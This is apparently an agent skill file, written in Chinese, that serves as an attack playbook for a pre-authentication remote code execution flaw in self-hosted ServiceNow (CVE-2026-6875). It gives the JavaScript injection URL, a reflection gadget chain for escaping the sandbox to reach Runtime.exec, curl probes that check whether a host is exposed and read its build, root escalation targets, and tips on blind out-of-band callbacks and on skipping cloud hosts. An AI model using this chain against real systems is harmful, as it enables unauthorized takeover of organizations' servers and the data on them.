---
name: servicenow-preauth-rce
description: "Use when 打 ServiceNow 自托管：JS 注入→沙箱逃逸→RCE。"
---

# ServiceNow AI Platform 预认证 RCE：JS 注入 → 沙箱逃逸 → root（CVE-2026-6875）

**CVSS 9.5**，**CISA KEV 2026-07-13**（在野利用），Searchlight Cyber 2026-04-01 发现。**只打自托管**，ServiceNow Cloud 由厂商统一修。

## 入口

```
GET /assessment_thanks.do?sysparm_assessable_type=javascript:<注入码>
```

`sysparm_assessable_type` 参数**直接接受 `javascript:` 前缀**，把值当 JS 执行——无任何鉴权。

## 沙箱逃逸 gadget（三件套）

单纯 JS 沙箱里 `java.lang.Runtime` 拿不到，需要链：

```
DiscoveryFunctions.getCacheObjectForTable   // 拿到底层 Java 对象引用
  → AbstractAjaxProcessor                    // 拿到处理器上下文
    → Class.create                           // 构造新类，脱离沙箱限制
      → java.lang.Runtime.exec()            // 以应用权限执行系统命令
```

这三步的意义：**ServiceNow 的 Rhino/Nashorn 沙箱封的是全局对象，不封通过宿主 Java 类反射拿到的引用**。同样的思路适用于任何“JS 引擎嵌在 Java 应用里”的产品（Salesforce Apex 之外几乎全中）。

## 后续提权

拿到应用权限后，PoC 继续探：sudo 配置错误 / SUID 二进制 / 可写 cron / 内核漏洞。ServiceNow 常跑在专用主机上，从 `tomcat`/`servicenow` 用户到 root 往往只差一个 sudo 条目。

## 修复版本（判活对表）

**Brazil EA/GA、Australia Patch 2、Zurich Patch 7b / 9、Yokohama Patch 12 Hot Fix 1b / 13**

## 判据

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  'https://<host>/assessment_thanks.do?sysparm_assessable_type=javascript:1'
# 200 + 页面回显（而不是登录跳转/403） = 面开通
curl -s 'https://<host>/stats.do' | head -40   # 版本与 build 指纹
```

`/stats.do` 在部分部署也需鉴权，拿不到就靠登录页 footer 的 build tag。

## 坑

- **只打自托管**。`*.service-now.com` 是云，别浪费请求。
- `javascript:` 前缀能过说明参数没做协议白名单；回显里看不到执行结果时，用带外回连或时间差分。
- 沙箱逃逸 gadget 与具体 patch 级别强相关：Zurich 7b 之前三件套齐；后期版本部分 API 被改名，需要重新找 `Class.create` 的等价物。
- 拿到 shell 后先看是不是容器（ServiceNow 容器化部署不少），容器里 root 不等于宿主。
